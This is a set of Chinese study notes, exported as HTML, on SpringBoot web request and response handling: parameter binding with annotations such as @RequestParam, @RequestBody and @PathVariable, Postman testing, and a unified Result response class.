<li><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></li>
<li>需要记录的内容的标准：
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>按照期末考前的笔记选择标准来记：
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>努力克服完美强迫症</li>
<li><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></li>
</ul>
<h2 id="Day05-SpringBootWeb请求响应"><a class="header-anchor" href="#Day05-SpringBootWeb请求响应">¶</a>Day05-SpringBootWeb请求响应</h2>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/K5mRdtkvKoxyDNxyXUxchx4vn8c">‌‬‍﻿﻿‬‌⁠﻿‍⁠‍‍⁠‬‌‌﻿‍⁠‬‍‍‍⁠‍‍‬‬⁠⁠‬﻿‍‌Day05-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h3 id="前言-BS架构"><a class="header-anchor" href="#前言-BS架构">¶</a>前言-BS架构</h3>
<ul>
<li>
<p><u>浏览器</u>发起请求，<u>请求</u>了我们的后端web<u>服务器</u><strong>(也就是内置的Tomcat)</strong></p>
</li>
<li>
<p>在开发web程序时呢，定义一个控制器类Controller，请求被部署在<strong>Tomcat中的Controller</strong>接收</p>
</li>
<li>
<p>然后Controller再给浏览器一个<strong>响应</strong>，响应一个字符串 “Hello World”。 而在请求响应的过程中是<strong>遵循HTTP协议</strong>的</p>
</li>
<li>
<p>但Tomcat这类Web服务器中，不识别自己定义的Controller</p>
</li>
<li>
<p>Tomcat是一个Servlet容器，支持Serlvet规范</p>
</li>
<li>
<p>SpringBoot进行web程序开发时，它内置了一个核心的Servlet程序 DispatcherServlet，称之为 <strong>核心控制器</strong></p>
<ul>
<li>DispatcherServlet 负责接收页面发送的请求，然后根据执行的规则，将请求再转发给后面的请求处理器Controller</li>
<li>请求处理器处理完请求之后，最终再由DispatcherServlet给浏览器响应数据</li>
</ul>
</li>
<li>
<p>浏览器发送请求，会携带请求数据，包括：请求行、请求头；</p>
<ul>
<li>请求到达tomcat之后，tomcat会负责<u>解析请求数据</u>，然后将解析后的请求数据传递给Servlet程序的HttpServletRequest对象， <u>HttpServletRequest</u> 对象就可以获取到请求数据。</li>
<li>Tomcat还给Servlet程序传递了一个参数 <u>HttpServletResponse</u>，通过这个对象，就可以给浏览器设置响应数据</li>
</ul>
</li>
<li>
<p><strong><u>浏览器/服务器的架构模式→BS架构</u></strong></p>
<ul>
<li>
<p><strong>Browser / Server</strong></p>
</li>
<li>
<p><strong>浏览器 / 服务器架构模式</strong></p>
</li>
<li>
<p><strong>客户端只需要浏览器，应用程序的逻辑和数据都存储在服务端</strong></p>
<blockquote>
<p>请求</p>
<p>响应</p>
<p>分层解耦</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="请求"><a class="header-anchor" href="#请求">¶</a>请求</h3>
<ul>
<li>如何接收页面传递的请求</li>
</ul>
<h4 id="Postman"><a class="header-anchor" href="#Postman">¶</a>Postman</h4>
<ul>
<li>
<p>专业的接口测试工具</p>
</li>
<li>
<p>功能强大的网页调试与发送网页HTTP请求的Chrome插件</p>
</li>
<li>
<p>此处缺图  1.1.2  Postman界面介绍</p>
</li>
<li>
<p>需要保存测试信息：登陆账号→创建工作空间（有点像创建代码仓库）→创建请求→点击<code>Save</code>保存当前请求→给请求起个别名+创建分类（保存请求时指定保存在哪个分类下）→</p>
</li>
</ul>
<h5 id="简单参数"><a class="header-anchor" href="#简单参数">¶</a>简单参数</h5>
<ul>
<li>在向服务器发起请求时，向服务器传递的是一些普通的请求数据</li>
<li>两种接收参数的方式：
<ul>
<li>原始方式</li>
<li>Springboot方式</li>
</ul>
</li>
</ul>
<h6 id="原始方式"><a class="header-anchor" href="#原始方式">¶</a>原始方式</h6>
<ul>
<li>
<p>通过Servlet中提供的API：HttpServletRequest（请求对象），获取请求的相关信息</p>
<blockquote>
<p>Tomcat接收到http请求时：把请求的相关信息封装到HttpServletRequest对象中</p>
</blockquote>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据指定的参数名获取请求参数的数据值</span></span><br><span class="line">String  request.getParameter(<span class="string">&quot;参数名&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//原始方式</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="comment">// http://localhost:8080/simpleParam?name=Tom&amp;age=10</span></span><br><span class="line">        <span class="comment">// 请求参数： name=Tom&amp;age=10   （有2个请求参数）</span></span><br><span class="line">        <span class="comment">// 第1个请求参数： name=Tom   参数名:name，参数值:Tom</span></span><br><span class="line">        <span class="comment">// 第2个请求参数： age=10     参数名:age , 参数值:10</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);<span class="comment">//name就是请求参数名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ageStr</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;age&quot;</span>);<span class="comment">//age就是请求参数名</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> Integer.parseInt(ageStr);<span class="comment">//需要手动进行类型转换</span></span><br><span class="line">        System.out.println(name+<span class="string">&quot;  :  &quot;</span>+age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 仅了解，开发中用不到</span></span><br></pre></td></tr></table></figure>
<h6 id="SpringBoot方式"><a class="header-anchor" href="#SpringBoot方式">¶</a>SpringBoot方式</h6>
<ul>
<li>改进：对原始的API进行了封装，接收参数的形式更加简单</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">// http://localhost:8080/simpleParam?name=Tom&amp;age=10</span></span><br><span class="line">    <span class="comment">// 第1个请求参数： name=Tom   参数名:name，参数值:Tom</span></span><br><span class="line">    <span class="comment">// 第2个请求参数： age=10     参数名:age , 参数值:10</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//springboot方式</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(String name , Integer age )</span>&#123;<span class="comment">//形参名和请求参数名保持一致</span></span><br><span class="line">        System.out.println(name+<span class="string">&quot;  :  &quot;</span>+age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="GET和POST在Postman中的测试方式"><a class="header-anchor" href="#GET和POST在Postman中的测试方式">¶</a>GET和POST在Postman中的测试方式</h6>
<ul>
<li><code>GET请求</code>：点击<code>Params</code>，在<code>KEY</code>中输入参数名，在<code>VALUE</code>中输入参数值</li>
<li><code>POST请求</code>：<code>Body</code> → <code>x-www-form-urlencoded</code>→在<code>KEY</code>中输入参数名，在<code>VALUE</code>中输入参数值</li>
</ul>
<blockquote>
<p>不论是GET请求还是POST请求，对于简单参数来讲，只要保证==请求参数名和Controller方法中的形参名保持一致==，就可以获取到请求参数中的数据值</p>
</blockquote>
<h6 id="参数名不一致"><a class="header-anchor" href="#参数名不一致">¶</a>参数名不一致</h6>
<ul>
<li>对于简单参数来讲，请求参数名和controller方法中的形参名不一致时，无法接收到请求数据</li>
<li>解决方案：可以使用Spring提供的<code>@RequestParam</code>注解完成映射</li>
<li>在方法形参前面加上 <code>@RequestParam</code> 然后通过<code>value</code>属性执行请求参数名，从而完成映射</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">// http://localhost:8080/simpleParam?name=Tom&amp;age=20</span></span><br><span class="line">    <span class="comment">// 请求参数名：name</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//springboot方式</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(<span class="meta">@RequestParam(&quot;name&quot;)</span> String username , Integer age )</span>&#123;</span><br><span class="line">        System.out.println(username+<span class="string">&quot;  :  &quot;</span>+age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>@RequestParam中的required属性默认为true（默认值也是true），代表该请求参数必须传递，如果不传递将报错</p>
<p>如果该参数可选，可将required属性设置为false</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(<span class="meta">@RequestParam(name = &quot;name&quot;, required = false)</span> String username, Integer age)</span>&#123;</span><br><span class="line"> System.out.println(username+ <span class="string">&quot;:&quot;</span> + age);</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="实体参数"><a class="header-anchor" href="#实体参数">¶</a>实体参数</h5>
<ul>
<li>简单参数：前端传递了多少个请求参数，后端controller方法中的形参就要书写多少个</li>
<li>改进：将请求参数封装到一个实体类对象中
<ul>
<li>遵守：<strong>请求参数名与实体类的属性名相同</strong></li>
</ul>
</li>
</ul>
<h6 id="简单实体对象"><a class="header-anchor" href="#简单实体对象">¶</a>简单实体对象</h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义POJO实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;  <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">// 一堆getter和setter函数</span></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Controller方法</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//实体参数：简单实体对象</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/simplePojo&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">simplePojo</span><span class="params">(User user)</span>&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Postman测试</span></span><br><span class="line">- 参数名和实体类属性名一致时：正确返回数据值</span><br><span class="line">- 参数名和实体类属性名不一致时：不对应的项返回值为<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<h6 id="复杂实体对象"><a class="header-anchor" href="#复杂实体对象">¶</a>复杂实体对象</h6>
<ul>
<li>在实体类中有一个或多个属性，也是实体对象类型的</li>
<li>需遵循：<strong>请求参数名与形参对象属性名相同，按照对象层次结构关系即可接收嵌套实体类属性参数</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义POJO实体类</span></span><br><span class="line">	<span class="comment">// 定义 Address 实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String province;  <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="comment">// 一堆的getter和setter函数</span></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// User实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Address address; <span class="comment">//地址对象</span></span><br><span class="line">	<span class="comment">// 一堆的getter和setter函数</span></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Controller方法</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//实体参数：复杂实体对象</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/complexPojo&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">complexPojo</span><span class="params">(User user)</span>&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="数组集合参数"><a class="header-anchor" href="#数组集合参数">¶</a>数组集合参数</h5>
<ul>
<li>使用场景：在HTML的表单中，有一个表单项是支持多选的(复选框)，可以提交选择的多个值</li>
<li>后端接收多个值的两种方式：
<ul>
<li>数组</li>
<li>集合</li>
</ul>
</li>
</ul>
<h6 id="数组"><a class="header-anchor" href="#数组">¶</a>数组</h6>
<ul>
<li><strong>请求参数名与形参数组名称相同且请求参数为多个，定义数组类型形参即可接收参数</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//数组集合参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/arrayParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">arrayParam</span><span class="params">(String[] hobby)</span>&#123;</span><br><span class="line">        System.out.println(Arrays.toString(hobby));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前端请求时有两种传递形式
<ul>
<li>方式1：<code> xxxxxxxxxx?hobby=game&amp;hobby=java</code></li>
<li>方式2：<code>xxxxxxxxxxxxx?hobby=game,java</code></li>
</ul>
</li>
</ul>
<h6 id="集合"><a class="header-anchor" href="#集合">¶</a>集合</h6>
<ul>
<li>
<p><strong>请求参数名与形参集合对象名相同且请求参数为多个，@RequestParam 绑定参数关系</strong></p>
<blockquote>
<p>默认情况下，请求中参数名相同的多个值，是封装到数组。如果要封装到集合，要使用@RequestParam绑定参数关系</p>
</blockquote>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//数组集合参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">listParam</span><span class="params">(<span class="meta">@RequestParam</span> List&lt;String&gt; hobby)</span>&#123;</span><br><span class="line">        System.out.println(hobby);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="日期参数"><a class="header-anchor" href="#日期参数">¶</a>日期参数</h5>
<ul>
<li>日期的格式多样，对日期类型的参数进行封装时，需要通过<code>@DateTimeFormat</code>注解，以及其<code>pattern</code>属性来<strong>设置日期的格式</strong></li>
<li><code>@DateTimeFormat</code>注解的<code>pattern</code>属性中指定了哪种日期格式，前端的日期参数就必须按照指定的格式传递。</li>
<li>后端<code>controller</code>方法中，需要使用<code>Date</code>类型或<code>LocalDateTime</code>类型，来封装传递的参数。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//日期时间参数</span></span><br><span class="line">   <span class="meta">@RequestMapping(&quot;/dateParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">dateParam</span><span class="params">(<span class="meta">@DateTimeFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span> LocalDateTime updateTime)</span>&#123;</span><br><span class="line">        System.out.println(updateTime);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="JSON参数"><a class="header-anchor" href="#JSON参数">¶</a>JSON参数</h5>
<ul>
<li>前后端进行交互时，前后端通过会使用JSON格式的数据传输比较复杂的参数</li>
</ul>
<ol>
<li>Postman在发送请求时，如何传递json格式的请求参数</li>
<li>在服务端的controller方法中，如何接收json格式的请求参数</li>
</ol>
<ul>
<li>
<p>Postman发送JSON格式数据</p>
<ul>
<li>JSON格式数据需要放在请求体中，使用<code>POST</code>方式</li>
<li><code>Body</code>→<code>raw</code>→选<code>JSON</code>→输入<code>JSON</code>格式数据</li>
</ul>
</li>
<li>
<p>服务端Controller方法接收JSON格式数据</p>
<ul>
<li>传递json格式的参数，在Controller中会使用实体类进行封装</li>
<li>封装规则：<strong>JSON数据键名与形参对象属性名相同，定义POJO类型形参即可接收参数。需要使用 @RequestBody标识</strong></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实体类Address</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="comment">//省略GET , SET 方法</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="comment">// 实体类User</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="comment">//省略GET , SET 方法</span></span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="comment">// Controller方法</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//JSON参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jsonParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">jsonParam</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="路径参数"><a class="header-anchor" href="#路径参数">¶</a>路径参数</h5>
<ul>
<li>
<p>传统开发中请求参数：<code>放在请求体(POST请求)传递</code>或<code>跟在URL后面通过?key=value的形式传递(GET请求)</code></p>
</li>
<li>
<p>现在的开发：直接在请求的URL中传递参数→路径参数</p>
</li>
<li>
<p>路径参数：</p>
<ul>
<li><code>前端</code>：通过请求URL直接传递参数</li>
<li><code>后端</code>：使用{…}来标识该路径参数，需要使用<code>@PathVariable</code>获取路径参数
<ul>
<li>因为前端传递的路径参数值是可变的，所以后端接收到路径参数时，使用<code>&quot;&#123;key&#125;&quot;</code>方式来标记路径参数</li>
<li><code>@PathVariable</code>注解：
<ul>
<li>获取到路径参数<code>&#123;id&#125;</code></li>
<li>把路径参数绑定到形参变量id</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//路径参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/path/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">pathParam</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span>&#123;</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>传递多个路径参数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestController</span> &#123;</span><br><span class="line">    <span class="comment">//路径参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/path/&#123;id&#125;/&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">pathParam2</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, <span class="meta">@PathVariable</span> String name)</span>&#123;</span><br><span class="line">        System.out.println(id+ <span class="string">&quot; : &quot;</span> +name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="响应"><a class="header-anchor" href="#响应">¶</a>响应</h3>
<ul>
<li>Controller程序可以接收请求，还可以进行响应</li>
</ul>
<h4 id="ResponseBody"><a class="header-anchor" href="#ResponseBody">¶</a>@ResponseBody</h4>
<ul>
<li>
<p>注解：</p>
<ul>
<li><code>类型</code>：方法注解、类注解</li>
<li><code>位置</code>：书写在Controller方法上或类上</li>
<li><code>作用</code>：将方法返回值直接响应给浏览器
<ul>
<li>如果返回值类型是<code>实体对象/集合</code>，将会转换为JSON格式后在响应给浏览器</li>
</ul>
</li>
</ul>
</li>
<li>
<p>@<code>RestController</code>注解是一个组合注解</p>
<ul>
<li><code>@RestController = @Controller + @ResponseBody</code></li>
<li>∴即使只有<code>@RestController</code>注解和<code>@RequestMapping</code>注解，即使没有<code>@ResponseBody</code>注解，也可以给浏览器响应</li>
</ul>
</li>
<li>
<p>@RestController源码</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span>   <span class="comment">//元注解（修饰注解的注解）</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span>  <span class="comment">//元注解</span></span><br><span class="line"><span class="meta">@Documented</span>    <span class="comment">//元注解</span></span><br><span class="line"><span class="meta">@Controller</span>   </span><br><span class="line"><span class="meta">@ResponseBody</span> </span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> RestController &#123;</span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = Controller.class</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>结论</code>：在类上添加<code>@RestController</code>就相当于添加了<code>@ResponseBody</code>注解</p>
</li>
<li>
<p>类上有@RestController注解或@ResponseBody注解时：表示当前类下所有的方法返回值做为响应数据</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//响应字符串</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World ~&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World ~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//响应实体对象</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getAddr&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Address <span class="title function_">getAddr</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Address</span> <span class="variable">addr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();<span class="comment">//创建实体类对象</span></span><br><span class="line">        addr.setProvince(<span class="string">&quot;广东&quot;</span>);</span><br><span class="line">        addr.setCity(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//响应集合数据</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listAddr&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Address&gt; <span class="title function_">listAddr</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;Address&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();<span class="comment">//集合对象</span></span><br><span class="line">        <span class="type">Address</span> <span class="variable">addr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">        addr.setProvince(<span class="string">&quot;广东&quot;</span>);</span><br><span class="line">        addr.setCity(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Address</span> <span class="variable">addr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">        addr2.setProvince(<span class="string">&quot;陕西&quot;</span>);</span><br><span class="line">        addr2.setCity(<span class="string">&quot;西安&quot;</span>);</span><br><span class="line"></span><br><span class="line">        list.add(addr);</span><br><span class="line">        list.add(addr2);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="统一响应结果"><a class="header-anchor" href="#统一响应结果">¶</a>统一响应结果</h4>
<ul>
<li>在真实的项目开发中：无论使用哪种方法，定义一个统一的返回结果</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Result</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 响应码，1 代表成功；0 代表失败</span></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提示信息</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回的数据</span></span><br><span class="line">    <span class="keyword">private</span> Object data;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体例子</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;操作成功&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>前端：只需要按照统一格式的返回结果进行解析(仅一种解析方案)，就可以拿到数据</p>
</blockquote>
<ul>
<li>
<p>统一的返回结果使用<strong>类</strong>来描述，这个结果中包含：</p>
<ul>
<li><strong>响应状态码</strong>：当前请求是成功，还是失败</li>
<li><strong>状态码信息</strong>：给页面的提示信息</li>
<li><strong>返回的数据</strong>：给前端响应的数据（字符串、对象、集合）</li>
</ul>
</li>
<li>
<p>定义在一个实体类Result来包含以上信息</p>
</li>
</ul>
